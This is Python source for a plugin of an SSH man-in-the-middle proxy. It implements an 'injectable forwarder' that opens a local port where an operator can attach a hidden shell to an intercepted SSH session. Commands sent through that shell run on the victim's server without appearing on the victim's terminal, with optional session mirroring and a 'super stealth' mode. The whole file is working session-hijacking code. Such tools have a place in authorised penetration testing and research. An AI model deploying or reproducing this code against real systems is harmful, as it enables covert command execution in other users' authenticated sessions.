import logging
import queue
import select
import threading
import socket
import time

import paramiko

from ssh_proxy_server.forwarders.ssh import SSHForwarder
from ssh_proxy_server.plugins.ssh.mirrorshell import InjectServer


class SSHInjectableForwarder(SSHForwarder):

    HOST_KEY_LENGTH = 2048

    @classmethod
    def parser_arguments(cls):
        cls.parser().add_argument(
            '--ssh-injector-net',
            dest='ssh_injector_net',
            default='127.0.0.1',
            help='local address/interface where injector sessions are served'
        )
        cls.parser().add_argument(
            '--ssh-injector-enable-mirror',
            dest='ssh_injector_enable_mirror',
            action="store_true",
            help='enables host session mirroring for the injector shell'
        )
        cls.parser().add_argument(
            '--ssh-injectshell-key',
            dest='ssh_injectshell_key'
        )
        cls.parser().add_argument(
            '--ssh-injector-super-stealth',
            dest='ssh_injector_super_stealth',
            action='store_true',
            help='enables stealth injector operation (best used with session mirror)'
        )

    def __init__(self, session):
        super(SSHInjectableForwarder, self).__init__(session)
        self.injector_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.injector_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.injector_sock.bind((self.args.ssh_injector_net, 0))
        self.injector_sock.listen(5)

        self.mirror_enabled = self.args.ssh_injector_enable_mirror
        self.queue = queue.PriorityQueue()
        self.clear_signal = None
        self.clear = True
        self.sender = self.session.ssh_channel
        self.injector_shells = []
        thread = threading.Thread(target=self.injector_connect)
        thread.start()
        self.conn_thread = thread

    def injector_connect(self):
        inject_host, inject_port = self.injector_sock.getsockname()
        logging.info(
            "created stealth shell on port {port}. connect with: ssh -p {port} {host}".format(
                host=inject_host,
                port=inject_port
            )
        )
        try:
            while not self.session.ssh_channel.closed:
                readable = select.select([self.injector_sock], [], [], 0.5)[0]
                if len(readable) == 1 and readable[0] is self.injector_sock:
                    client, addr = self.injector_sock.accept()

                    t = paramiko.Transport(client)
                    t.set_gss_host(socket.getfqdn(""))

                    t.load_server_moduli()
                    if self.args.ssh_injectshell_key:
                        t.add_server_key(paramiko.RSAKey(filename=self.args.ssh_injectshell_key))
                    else:
                        t.add_server_key(paramiko.RSAKey.generate(bits=self.HOST_KEY_LENGTH))

                    inject_server = InjectServer(self.server_channel)
                    try:
                        t.start_server(server=inject_server)
                    except (ConnectionResetError, EOFError, paramiko.SSHException):
                        t.close()
                        continue
                    injector_channel = None
                    while not injector_channel:
                        injector_channel = t.accept(0.5)
                    injector_shell = InjectorShell(addr, injector_channel, self)
                    injector_shell.start()
                    self.injector_shells.append(injector_shell)
                time.sleep(0.1)
        except (paramiko.SSHException, OSError) as e:
            logging.warning("injector connection suffered an unexpected error")
            logging.exception(e)
            self.close_session(self.channel)

    def forward_stdin(self):
        if self.session.ssh_channel.recv_ready():
            self.clear = False
            buf = self.session.ssh_channel.recv(self.BUF_LEN)
            logging.debug("Client:" + str(buf))
            self.queue.put((0, buf, self.session.ssh_channel))

    def forward_stdout(self):
        if self.server_channel.recv_ready():
            buf = self.server_channel.recv(self.BUF_LEN)
            if self.sender == 'clear_signal':
                self.clear_signal = buf.strip()
                self.sender = self.session.ssh_channel
                return
            if self.clear_signal:
                if self.clear_signal in buf:
                    self.clear = True
            logging.debug("Server:" + str(buf))
            logging.debug(self.clear)
            self.sender.sendall(buf)
            if self.mirror_enabled and self.sender == self.session.ssh_channel:
                for shell in self.injector_shells:
                    if shell.client_channel is not self.sender:
                        shell.client_channel.sendall(buf)

    def forward_extra(self):
        if not self.server_channel.recv_ready() and not self.session.ssh_channel.recv_ready() and not self.queue.empty():
            if not self.clear_signal:
                self.server_channel.sendall(b'\r')
                self.sender = 'clear_signal'
                return
            prio, msg, sender = self.queue.get()
            if sender is not self.session.ssh_channel and not self.clear:
                self.queue.put((prio, msg, sender))
                return
            self.server_channel.sendall(msg)
            self.sender = sender
            self.queue.task_done()

    def close_session(self, channel):
        super().close_session(channel)
        for shell in self.injector_shells:
            shell.join()
        self.conn_thread.join()
        self.injector_sock.close()


class InjectorShell(threading.Thread):

    BUF_LEN = 1024
    STEALTH_WARNING = """
[INFO]\r
This is a hidden shell injected into the secure session the original host created.\r
Any commands issued CAN affect the environment of the user BUT will not be displayed on their terminal!\r
Exit the hidden shell with CTRL+C\r
"""
    SUPER_STEALTH = """
[SUPERSTEALTH]\r
Commands from the injected shell will only be executed if they do not interfere with normal operation of the original host!\r
"""

    def __init__(self, remote, client_channel, forwarder):
        super(InjectorShell, self).__init__()
        self.remote = remote
        self.forwarder = forwarder
        self.queue = self.forwarder.queue
        self.client_channel = client_channel
        self.command = b''

    def run(self) -> None:
        self.client_channel.sendall(
            self.STEALTH_WARNING + (self.SUPER_STEALTH if self.forwarder.args.ssh_injector_super_stealth else "")
        )
        try:
            while not self.forwarder.session.ssh_channel.closed:
                if self.client_channel.recv_ready():
                    data = self.client_channel.recv(self.forwarder.BUF_LEN)
                    self.command += data
                    if data == b'\x03':
                        break
                    if self.forwarder.args.ssh_injector_super_stealth:
                        if data == b'\r':
                            self.queue.put((1, self.command, self.client_channel))
                            self.command = b''
                        self.client_channel.sendall(data)
                    else:
                        self.queue.put((1, self.command, self.client_channel))
                        self.command = b''

                if self.client_channel.exit_status_ready():
                    break
                time.sleep(0.1)
        except paramiko.SSHException:
            logging.warning("injector shell %s with unexpected SSHError", str(self.remote))
        finally:
            self.terminate()

    def terminate(self):
        if not self.forwarder.session.ssh_channel.closed:
            self.forwarder.injector_shells.remove(self)
        self.client_channel.get_transport().close()
